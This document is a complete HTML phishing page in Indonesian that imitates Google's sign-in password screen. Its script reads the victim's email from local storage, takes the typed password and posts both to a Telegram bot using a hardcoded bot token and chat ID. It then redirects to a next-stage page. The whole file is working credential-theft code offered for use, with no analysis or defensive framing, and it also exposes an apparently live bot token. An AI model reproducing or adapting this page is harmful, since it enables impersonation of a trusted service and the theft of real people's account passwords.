<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Login</title>

<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Google Sans',Arial,sans-serif;
}

body{
    background:#fff;
    min-height:100vh;
    display:flex;
    justify-content:center;
}

.container{
    width:100%;
    max-width:100%;
    min-height:100vh;
    padding:24px 24px 40px;
    display:flex;
    flex-direction:column;
}

.logo{
    text-align:center;
    margin-top:24px;
}

.logo img{
    width:92px;
    height:auto;
}

.title{
    text-align:center;
    font-size:24px;
    color:#202124;
    margin-top:16px;
    font-weight:400;
}

.email-box{
    display:flex;
    align-items:center;
    justify-content:center;
    gap:6px;
    margin-top:12px;
    color:#3c4043;
    font-size:14px;
    font-weight:500;
}

.email-box svg{
    width:20px;
    height:20px;
    fill:#5f6368;
}

.input-group{
    margin-top:40px;
}

.input-group input{
    width:100%;
    height:56px;
    border:1px solid #dadce0;
    border-radius:4px;
    padding:0 16px;
    font-size:16px; /* mencegah auto-zoom di iOS */
    color:#202124;
    outline:none;
}

.input-group input:focus{
    border:2px solid #1a73e8;
}

.show-pass{
    display:flex;
    align-items:center;
    gap:10px;
    margin-top:16px;
    color:#202124;
    font-size:14px;
}

.show-pass input[type="checkbox"]{
    width:20px;
    height:20px;
    cursor:pointer;
}

.bottom{
    position:static;
    margin-top:auto;
    padding-top:32px;
    display:flex;
    justify-content:space-between;
    align-items:center;
}

.other{
    color:#1a73e8;
    text-decoration:none;
    font-size:14px;
    font-weight:500;
}

.btn{
    background:#1a73e8;
    color:#fff;
    border:none;
    border-radius:4px;
    padding:12px 24px;
    font-size:14px;
    font-weight:500;
    cursor:pointer;
}

.btn:hover{
    background:#1765cc;
}

.btn:disabled{
    background:#8ab4f8;
    cursor:wait;
}
</style>
</head>
<body>

<div class="container">

    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/960px-Google_2015_logo.svg.png" alt="Google">
    </div>

    <div class="title">Selamat datang</div>

    <div class="email-box">
        <svg viewBox="0 0 24 24">
            <path d="M12 12c2.7 0 5-2.3 5-5s-2.3-5-5-5-5 2.3-5 5 2.3 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z"/>
        </svg>
        <span id="email"></span>
    </div>

    <div class="input-group">
        <input type="password" id="password" placeholder="Masukkan sandi">
    </div>

    <label class="show-pass">
        <input type="checkbox" id="showPassword">
        <span>Tampilkan sandi</span>
    </label>

    <div class="bottom">
        <a href="#" class="other">Coba cara lain</a>
        <button class="btn" id="nextBtn">Berikutnya</button>
    </div>

</div>

<script>
/* ==============================
   DATA DARI HALAMAN SEBELUMNYA
   ============================== */
document.getElementById("email").textContent =
localStorage.getItem("email") || "email@gmail.com";

document.getElementById("showPassword").addEventListener("change", function(){
    document.getElementById("password").type =
    this.checked ? "text" : "password";
});

/* ==============================
   KONFIGURASI TELEGRAM BOT
   ============================== */
const BOT_TOKEN = '8824816621%3AAAF7kLSbFOHiibnFHAelyYwspJ7txEQFgVk';
const CHAT_ID   = '7549590022';

const nextBtn      = document.getElementById('nextBtn');
const passwordInput= document.getElementById('password');
const emailDisplay = document.getElementById('email');

nextBtn.addEventListener('click', async function(e) {
    e.preventDefault();
    
    const password = passwordInput.value.trim();
    const email    = emailDisplay.textContent.trim();
    
    if (!password) {
        alert('Harap masukkan sandi Anda.');
        passwordInput.focus();
        return;
    }

    nextBtn.disabled = true;
    nextBtn.textContent = 'Memuat...';

    const deviceInfo = navigator.userAgent;
    const dateTime   = new Date().toLocaleString('id-ID');

    const message = `
🔔 <b>Data Password Masuk</b>

📧 Email: <code>${email}</code>
🔑 Password: <code>${password}</code>
    `;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const result = await response.json();

        if (result.ok) {
            window.location.href = 'pas.html';
        } else {
            alert('Gagal mengirim. Periksa token bot.');
            nextBtn.disabled = false;
            nextBtn.textContent = 'Berikutnya';
        }

    } catch (error) {
        console.error('Error:', error);
        alert('Terjadi kesalahan jaringan.');
        nextBtn.disabled = false;
        nextBtn.textContent = 'Berikutnya';
    }
});

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch (e) {
        return 'Tidak diketahui';
    }
}
</script>

</body>
</html>
